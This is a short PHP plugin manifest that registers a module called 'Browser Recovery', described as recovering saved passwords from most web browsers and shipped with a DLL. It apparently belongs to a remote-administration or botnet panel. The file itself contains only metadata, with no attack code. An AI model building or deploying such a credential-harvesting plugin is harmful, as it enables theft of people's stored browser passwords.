<?php
if(!isset($initialized))
{
	include('../../pages/404.php');
}

$plugin_name = "Browser Recovery";
$plugin_guid = "022f60a9-fe33-495f-96f7-73f16c0a3b2a"; // GUID should be different for diferent versions
$plugin_desc = "Recovers saved passwords from most web browsers!";
$plugin_author = "RonnyRoy";
$plugin_icon = "<i class='fa fa-key'></i>"; // Font awesome icons
$plugin_version_str = "1.0.0.0";
$plugin_version_int = 1000;
$plugin_has_dll = true;
?>